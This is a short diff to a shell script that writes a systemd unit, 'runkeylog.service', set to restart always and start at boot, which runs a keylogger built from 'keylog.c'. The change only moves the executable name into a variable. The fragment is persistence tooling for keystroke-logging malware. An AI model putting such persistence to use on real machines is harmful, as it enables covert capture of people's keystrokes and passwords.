@@ -20,7 +20,7 @@ file_writer () {
 		echo "Type=simple" >> $filename
 		echo "Restart=always" >> $filename
 		echo "RestartSec=1" >> $filename
-		echo "ExecStart=/usr/bin/keyloggertest" >> $filename
+		echo "ExecStart=/usr/bin/$execname" >> $filename
 		echo >> $filename
 		echo "[Install]" >> $filename
 		echo "WantedBy=multi-user.target" >> $filename
@@ -28,6 +28,7 @@ file_writer () {
 }
 
 # The start of script
+execname="runkeylog"
 filename="runkeylog.service"
 
 # Copy where every the exec program for keylog.c is
